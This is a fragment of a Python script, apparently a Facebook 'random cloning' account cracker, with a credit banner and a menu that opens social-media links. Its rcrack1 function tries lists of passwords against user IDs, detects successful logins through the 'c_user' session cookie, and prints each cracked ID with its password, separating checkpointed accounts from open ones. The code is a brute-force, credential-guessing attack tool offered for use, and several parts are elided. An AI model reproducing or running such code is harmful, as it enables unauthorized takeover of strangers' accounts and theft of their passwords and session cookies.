...
|  $$$$$$/| $$  | $$| $$$$$$$/| $$$$$$$/ /$$$$$$| $$  | $$
 ...
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mSAUM AHMED SABBIR   \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m SAUM AHMED SABBIR                \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mM1ndapl4yerS4bb1r               \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning Bd     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mDF-71                   \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.0                   \033[1;93m|
 \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m SABBIR HELPING ZONE....
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××""")
...
class Main:
    def __init__(self):
        ...
        if HASAN in ["1", "01"]:
            v1()
            os.system('xdg-open https://facebook.com/groups/dark.force.71.we.are.fight.bangladesh/)
        if HASAN in ["2", "02"]:
            v2()
            os.system('xdg-open https://www.facebook.com/PappaBackOn')
        if HASAN in ["3","03"]:
            v3()
            os.system('xdg-open https://github.com/m1ndpl4yers4bb1r')
        if HASAN in [" 0", "00"]:
            exit()
        else:
            exit()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mSABBIR-VAU\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SABBIR-CP] {cid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SABBIR-VAU] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
